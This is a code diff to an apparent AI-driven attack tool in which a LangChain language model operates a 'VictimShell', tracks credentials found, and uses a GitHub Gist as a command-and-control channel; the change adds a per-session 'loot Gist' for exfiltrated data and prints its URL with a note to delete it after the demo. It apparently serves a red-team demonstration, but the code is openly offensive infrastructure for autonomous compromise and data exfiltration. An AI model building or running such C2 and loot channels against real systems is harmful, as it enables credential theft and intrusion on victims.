@@ -38,6 +38,7 @@ class AttackerState(TypedDict):
     shell: object          # VictimShell
     llm: object            # LangChain LLM
     c2: object             # GistC2
+    loot_url: str          # URL of loot Gist (empty if no C2)
     event_queue: object    # queue.Queue for SSE
 
     # Attack state
@@ -139,10 +140,13 @@ def run(
     llm = build_llm(cfg)
 
     c2 = None
+    loot_url = None
     github_token = cfg.get("c2", {}).get("github_token", "")
     if github_token and github_token != "ghp_XXXX":
         c2 = GistC2(token=github_token)
-        print(f"[Main] C2 channel enabled (GitHub Gist)")
+        loot_url = c2.create_loot_gist(session_id)
+        print(f"[Main] C2 + Loot Gist enabled")
+        print(f"[Main] Loot URL: {loot_url}")
     else:
         print(f"[Main] C2 channel disabled (no github_token configured)")
 
@@ -154,6 +158,7 @@ def run(
         shell=shell,
         llm=llm,
         c2=c2,
+        loot_url=loot_url or "",
         event_queue=event_queue,
         recon_output="",
         available_vectors=[],
@@ -202,6 +207,9 @@ def run(
     print(f"  Steps executed: {len(final_state['exec_results'])}")
     print(f"  Credentials found: {list(final_state['credentials_found'].keys())}")
     print(f"  Decisions made: {len(final_state['decision_log'])}")
+    if loot_url:
+        print(f"\n  LOOT GIST: {loot_url}")
+        print(f"  ↑ View and DELETE after demo")
     print(f"{'='*60}\n")
 
     if event_queue:
